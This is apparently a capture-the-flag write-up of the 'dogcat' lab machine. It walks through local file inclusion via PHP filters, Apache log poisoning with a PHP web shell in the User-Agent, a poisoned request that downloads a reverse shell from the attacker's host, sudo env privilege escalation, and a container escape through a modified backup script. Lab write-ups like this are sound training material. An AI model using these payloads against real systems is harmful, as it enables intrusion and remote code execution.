# dogcat

### dogcat
Nmap scan shows ports 22 and 80 open. `Gobuster` reveals the presence of a file called `flag.php`:<br />
![image](https://github.com/user-attachments/assets/f3527561-1727-47fb-bd14-3f8fc129f08e)<br />
After some testing, the following payload works to retrieve the code of `dog.php`: `http://10.10.181.198/?view=php://filter/read=convert.base64-encode/resource=dog`:<br />
![image](https://github.com/user-attachments/assets/905918ae-dd45-4f71-846f-67bfa1a742a8)<br />
To read the flag, I developed this payload: `http://10.10.25.29/?view=php://filter/read=convert.base64-encode/resource=./../../../../../usr/bin/cat/../../../var/www/html/flag`. It's built this way because the string needs to have the word "cat" or "dog" in it.<br />
![image](https://github.com/user-attachments/assets/016a6e00-8a7b-42ff-9f86-6c3bcae6fbb5)<br />
But now I want to see `/etc/passwd`. If I look at the source code of `index.php`:<br />
![Screenshot 2025-03-28 145653](https://github.com/user-attachments/assets/7ac238be-2da4-4ff8-80fc-10cfa37e849d)<br />
If a variable `ext` is not set, then it automatically adds `.php` at the end of the string. So the following payload will set `ext` to an empty string and will view `/etc/passwd`. Now I can perform log poisoning attack to get RCE. First, I send the following request by modifying the useragent to add php code into the access.log file: 

    GET /?ext=&view=/.dog/../../../../../var/log/apache2/access.log HTTP/1.1
    Host: 10.10.154.107
    User-Agent: <?php system($_GET['cmd']); ?>
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
Now, If I perform the following request: `http://10.10.154.107/?ext=&view=/.dog/../../../../../var/log/apache2/access.log&cmd=whoami`, I get RCE:<br />
![image](https://github.com/user-attachments/assets/7b899c2a-9a62-48fa-9b2e-3fcef422cf5b)<br />

The problem here is that I cannot spawn any reverse shell. The reason is that the target machine is actually a docker container, and doesn't have most of the commands that need to be used to spawn a reverse shell. So I got stuck for a while and had to look at an external writeup. Basically the solution is to use log poisoning, not to inject a `cmd` parameter, but to execute a small php script that will retrieve a shell from my host, In particular, the request is the following (pay attention to the useragent):

    GET /?ext=&view=/.dog/../../../../../var/log/apache2/access.log HTTP/1.1
    Host: 10.10.160.171
    User-Agent: <?php file_put_contents('rev.php',file_get_contents('http://10.11.85.53/shell.php')); ?>
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
So what I do is I create a revere php shell locally called `shell.php` (I used the one from pentest monkey), then I open a python webserver on port 80, and send the request above. Now there should be a file called `rev.php` in the root directory of the webserver, and we can just executing by visiting `http://IP_Addr/rev.php`:<br />
![image](https://github.com/user-attachments/assets/d6dd383a-6ac2-4cb7-96fd-0c30a4b28141)<br />
Second flag can be found in `/var/www`. Now if I run `sudo -l` I get this: <br />
![image](https://github.com/user-attachments/assets/0daa0c6a-c371-43cd-9792-f64804df3d56)<br />
The exploit for sudo on `env` can be found on [gtfobins](https://gtfobins.github.io/gtfobins/env/#sudo). Just run `/usr/bin/env /bin/sh -p` and become root and get the third flag! Now I need to find the last flag. Inside `/opt` there's a `backups` directory, that contains a compressed .tar file and a bash script. With root privileges I can decompress it and it creates a folder called `root` that contains the following files: <br />
![image](https://github.com/user-attachments/assets/77270443-e654-4545-9acb-289e51cde5d0)<br />
So I now know that this backup file actually contains files inside `/root/container/backup` from the host machine. In order to exploit this I can just modify the `backup.sh` file in order to give me a reverse shell (supposing it is a scheduled task from the host machine): <br />
![image](https://github.com/user-attachments/assets/a0708165-c128-456f-a003-60ea7d175bd8)<br />
This gets the 4th flag.


